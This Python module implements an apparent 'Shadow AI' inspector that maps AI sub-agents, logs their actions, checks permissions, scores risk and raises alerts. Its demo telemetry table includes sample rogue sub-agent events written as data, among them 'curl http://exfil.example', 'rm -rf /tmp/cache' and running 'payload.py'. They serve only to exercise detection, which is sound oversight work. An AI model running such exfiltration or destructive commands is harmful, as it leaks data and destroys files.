"""
Shadow AI Agent Inspector

Orchestrates the five focus functions:
  1. Map sub-agents under each main agent
  2. Track what they do (actions + targets)
  3. Check their permissions
  4. Calculate risk scores
  5. Alert when unauthorized actions happen

Discovery of main agents is out of scope here (handled by DiscoveryEngine).
"""

from __future__ import annotations

from typing import Dict, List, Optional

from src.alert_manager import AlertManager
from src.database import Database
from src.permission_scanner import PermissionScanner
from src.risk_engine import RiskEngine
from src.subagent_mapper import SubAgentMapper


# Demo telemetry used when no live action feed is available.
DEMO_ACTIONS: Dict[str, List[Dict]] = {
    'researcher': [
        {'action': 'read:files', 'target': '/docs/policy.md'},
        {'action': 'read:cloud', 'target': 's3://company-bucket'},
    ],
    'writer': [
        {'action': 'write:files', 'target': '/tmp/draft.txt'},
        {'action': 'send:email', 'target': 'ceo@company.com'},  # often unauthorized
    ],
    'coder': [
        {'action': 'execute:code', 'target': 'sandbox.py'},
        {'action': 'tool:shell', 'target': 'rm -rf /tmp/cache'},  # unauthorized if not granted
    ],
    'critic': [
        {'action': 'read:files', 'target': '/tmp/draft.txt'},
    ],
    'assistant': [
        {'action': 'read:database', 'target': 'users'},
        {'action': 'read:files', 'target': '/data/input.csv'},
    ],
    'user_proxy': [
        {'action': 'tool:shell', 'target': 'curl http://exfil.example'},
        {'action': 'execute:code', 'target': 'payload.py'},
    ],
    'planner': [
        {'action': 'read:files', 'target': '/plans/sprint.md'},
    ],
    'retriever': [
        {'action': 'read:database', 'target': 'embeddings'},
        {'action': 'read:files', 'target': '/kb/articles'},
    ],
    'tool_agent': [
        {'action': 'send:email', 'target': 'alerts@company.com'},
        {'action': 'read:cloud', 'target': 'gcp://logs'},
    ],
    'executor': [
        {'action': 'execute:code', 'target': 'chain_step.py'},
        {'action': 'write:files', 'target': '/out/result.json'},
    ],
    'worker': [
        {'action': 'read:files', 'target': '/work/queue.json'},
    ],
    'tool_caller': [
        {'action': 'read:cloud', 'target': 'api://tools'},
        {'action': 'write:database', 'target': 'audit_log'},  # unauthorized for default
    ],
}


class AgentInspector:
    """Single entry point for Shadow AI sub-agent oversight."""

    def __init__(self, db: Optional[Database] = None):
        self.db = db or Database()
        self.db.seed_unauthorized_permissions()
        self.mapper = SubAgentMapper(self.db)
        self.scanner = PermissionScanner(self.db)
        self.risk = RiskEngine(self.db)
        self.alerts = AlertManager(self.db)

    # ---- 1. Map sub-agents ----
    def map_sub_agents(
        self,
        parent_model_id: Optional[int] = None,
        parent_name: Optional[str] = None,
        framework: Optional[str] = None,
    ) -> Dict:
        parent = self._resolve_parent(parent_model_id, parent_name)
        if not parent:
            trees = self.mapper.map_all_parents()
            return {'mapped': trees, 'mode': 'all'}
        subs = self.mapper.map_sub_agents(parent['id'], framework=framework)
        return {
            'mode': 'single',
            'parent': parent,
            'sub_agents': subs,
        }

    def get_map(self, parent_model_id: Optional[int] = None) -> List[Dict]:
        if parent_model_id is not None:
            tree = self.mapper.get_tree(parent_model_id)
            return [tree] if tree else []
        return self.mapper.get_all_trees()

    # ---- 2. Track actions / targets ----
    def track_action(
        self,
        action: str,
        target: str,
        parent_model_id: Optional[int] = None,
        parent_name: Optional[str] = None,
        sub_agent_id: Optional[int] = None,
        sub_agent_name: Optional[str] = None,
        alert: bool = True,
    ) -> Dict:
        parent = self._resolve_parent(parent_model_id, parent_name)
        if not parent:
            return {'error': 'parent agent not found — run discovery first'}

        sub_id = sub_agent_id
        sub_name = sub_agent_name or ''
        if sub_id is None and sub_agent_name:
            for s in self.db.get_sub_agents(parent['id']):
                if s['name'].lower() == sub_agent_name.lower():
                    sub_id = s['id']
                    sub_name = s['name']
                    break

        result = self.scanner.track_action(
            parent_model_id=parent['id'],
            action=action,
            target=target,
            sub_agent_id=sub_id,
        )
        result['parent_name'] = parent['model_name']
        result['sub_agent_name'] = sub_name

        if alert and not result.get('is_authorized', True):
            result['alert'] = self.alerts.alert_unauthorized(
                result,
                parent_name=parent['model_name'],
                sub_agent_name=sub_name,
            )
        return result

    def simulate_activity(self, parent_model_id: Optional[int] = None) -> Dict:
        """
        Feed demo actions through track + alert pipeline for every mapped
        sub-agent. Useful until a live action bus exists.
        """
        parents = (
            [self._resolve_parent(parent_model_id, None)]
            if parent_model_id
            else self.db.get_all_models()
        )
        parents = [p for p in parents if p]

        all_results = []
        all_alerts = []
        for parent in parents:
            subs = self.db.get_sub_agents(parent['id'])
            if not subs:
                self.mapper.map_sub_agents(parent['id'])
                subs = self.db.get_sub_agents(parent['id'])

            for sub in subs:
                events = DEMO_ACTIONS.get(
                    sub['name'],
                    [{'action': 'read:files', 'target': '/unknown'}],
                )
                for ev in events:
                    r = self.track_action(
                        action=ev['action'],
                        target=ev.get('target', ''),
                        parent_model_id=parent['id'],
                        sub_agent_id=sub['id'],
                        sub_agent_name=sub['name'],
                        alert=True,
                    )
                    all_results.append(r)
                    if r.get('alert'):
                        all_alerts.append(r['alert'])

        return {
            'tracked': len(all_results),
            'unauthorized': len([r for r in all_results if not r.get('is_authorized')]),
            'alerts': all_alerts,
            'results': all_results,
        }

    # ---- 3. Check permissions ----
    def check_permissions(
        self,
        parent_model_id: Optional[int] = None,
        parent_name: Optional[str] = None,
    ) -> Dict:
        parent = self._resolve_parent(parent_model_id, parent_name)
        if not parent:
            return {'error': 'parent agent not found'}
        return self.scanner.check_parent_permissions(parent['id'])

    # ---- 4. Calculate risk ----
    def calculate_risk(
        self,
        parent_model_id: Optional[int] = None,
        parent_name: Optional[str] = None,
    ) -> Dict:
        parent = self._resolve_parent(parent_model_id, parent_name)
        if not parent:
            return {'all': self.risk.calculate_all()}
        return self.risk.calculate_parent_risk(parent['id'])

    # ---- 5. Alerts ----
    def get_alerts(self, pending_only: bool = True) -> List[Dict]:
        if pending_only:
            return self.alerts.get_pending_alerts()
        return self.alerts.get_all_alerts()

    def acknowledge_alert(self, alert_id: int) -> None:
        self.alerts.acknowledge(alert_id)

    # ---- Full inspect pipeline ----
    def inspect(
        self,
        parent_model_id: Optional[int] = None,
        parent_name: Optional[str] = None,
        run_demo_actions: bool = True,
    ) -> Dict:
        """
        End-to-end: map → (optional demo track) → permissions → risk → alerts.
        """
        parent = self._resolve_parent(parent_model_id, parent_name)
        mapped = self.map_sub_agents(
            parent_model_id=parent['id'] if parent else None,
            parent_name=parent_name,
        )

        activity = None
        if run_demo_actions:
            activity = self.simulate_activity(parent['id'] if parent else None)

        perms = (
            self.check_permissions(parent_model_id=parent['id'])
            if parent
            else {
                m['model_name']: self.check_permissions(parent_model_id=m['id'])
                for m in self.db.get_all_models()
            }
        )
        risk = self.calculate_risk(
            parent_model_id=parent['id'] if parent else None
        )
        alerts = self.get_alerts(pending_only=True)

        return {
            'map': mapped,
            'activity': activity,
            'permissions': perms,
            'risk': risk,
            'alerts': alerts,
        }

    def live_status(self, discovered: List[Dict]) -> List[Dict]:
        """
        For agents currently running on the system, return each main agent
        with the sub-agents mapped under it and whether each sub-agent has
        recent activity (working).
        """
        trees: List[Dict] = []
        seen_ids = set()

        for raw in discovered:
            parent = None
            if raw.get('id'):
                parent = self.db.get_model_by_id(raw['id'])
            if not parent:
                parent = self.db.get_model_by_name(raw.get('model_name', ''))
            if not parent:
                continue
            if parent['id'] in seen_ids:
                continue
            seen_ids.add(parent['id'])

            # Only treat as currently working if discovery marked active
            status = (raw.get('status') or parent.get('status') or 'active').lower()
            if status not in ('active', 'running', 'working'):
                continue

            self.mapper.map_sub_agents(parent['id'])
            subs = self.db.get_sub_agents(parent['id'])
            # Parent-level suspicious (no sub_agent or overall)
            parent_suspicious = self.db.get_suspicious_activities(
                model_id=parent['id'], limit=10
            )
            # Main agent is running ⇒ treat all mapped sub-agents as WORKING
            enriched = []
            for sub in subs:
                recent = self.db.get_agent_actions(sub_agent_id=sub['id'], limit=20)
                last_action = recent[0] if recent else None
                risk = self.risk.calculate_sub_agent_risk(sub['id'])

                # Suspicious = unauthorized actions + logged suspicious rows for this sub
                unauth_actions = [
                    a for a in recent if not a.get('is_authorized')
                ]
                sus_rows = self.db.get_suspicious_activities(
                    model_id=parent['id'],
                    sub_agent_id=sub['id'],
                    limit=10,
                )
                # Also match parent suspicious that mention this sub by name
                for srow in parent_suspicious:
                    if srow.get('sub_agent_id') == sub['id']:
                        continue
                    desc = (srow.get('description') or '').lower()
                    if sub['name'].lower() in desc and srow not in sus_rows:
                        sus_rows.append(srow)

                sus_labels = []
                seen_labels = set()
                for a in unauth_actions:
                    label = a.get('action') or 'unknown'
                    tgt = a.get('target') or ''
                    text = f"{label}" + (f"→{tgt}" if tgt else '')
                    if text not in seen_labels:
                        seen_labels.add(text)
                        sus_labels.append(text)
                for srow in sus_rows:
                    label = srow.get('permission') or srow.get('description') or 'suspicious'
                    # Prefer short permission token
                    short = str(label)
                    if 'attempted' in short.lower():
                        # extract 'action' from UNAUTHORIZED message if possible
                        short = srow.get('permission') or short[:40]
                    if short not in seen_labels:
                        seen_labels.add(short)
                        sus_labels.append(short)

                enriched.append(
                    {
                        **sub,
                        'working': True,
                        'last_action': last_action,
                        'recent_action_count': len(recent),
                        'risk_score': risk.get('score', 0),
                        'risk_level': risk.get('level', 'low'),
                        'suspicious_activities': sus_labels,
                        'suspicious_count': len(sus_labels),
                        'suspicious_details': sus_rows,
                    }
                )

            # Parent-only suspicious (not tied to a sub)
            parent_only_sus = [
                s for s in parent_suspicious if not s.get('sub_agent_id')
            ]
            parent_sus_labels = []
            for srow in parent_only_sus:
                label = srow.get('permission') or (srow.get('description') or '')[:40]
                if label and label not in parent_sus_labels:
                    parent_sus_labels.append(label)


            source = raw.get('source') or parent.get('process_name') or 'Unknown'
            model_type = (parent.get('model_type') or raw.get('model_type') or '').lower()
            if raw.get('channel'):
                channel = raw['channel']
            elif 'browser' in source.lower() or model_type == 'browser':
                channel = 'Browser'
            elif 'process' in source.lower() or raw.get('pid'):
                channel = 'Desktop'
            else:
                channel = source

            trees.append(
                {
                    'parent': {
                        **parent,
                        'source': source,
                        'channel': channel,
                        'url': raw.get('url', ''),
                        'window_title': raw.get('window_title', ''),
                        'pid': raw.get('pid', parent.get('pid')),
                        'live_status': 'working',
                        'suspicious_activities': parent_sus_labels,
                        'suspicious_count': len(parent_sus_labels),
                    },
                    'sub_agents': enriched,
                    'working_sub_agents': enriched,
                    'idle_sub_agents': [],
                }
            )
        return trees

    def _resolve_parent(
        self,
        parent_model_id: Optional[int],
        parent_name: Optional[str],
    ) -> Optional[Dict]:
        if parent_model_id is not None:
            for m in self.db.get_all_models():
                if m['id'] == parent_model_id:
                    return m
            return None
        if parent_name:
            return self.db.get_model_by_name(parent_name)
        return None


def main():
    """Quick CLI smoke test for the inspector."""
    from rich.console import Console
    from rich.pretty import pprint

    console = Console()
    inspector = AgentInspector()

    models = inspector.db.get_all_models()
    if not models:
        console.print(
            "[yellow]No main agents in DB yet. "
            "Run discovery first, or seeding a demo parent...[/yellow]"
        )
        mid = inspector.db.save_model('DemoCrewAI', 'crewai', 0, 'demo-crew')
        console.print(f"[green]Seeded demo parent id={mid}[/green]")

    report = inspector.inspect(run_demo_actions=True)
    console.print("\n[bold cyan]=== Shadow AI Inspect Report ===[/bold cyan]\n")
    pprint(report)


if __name__ == '__main__':
    main()
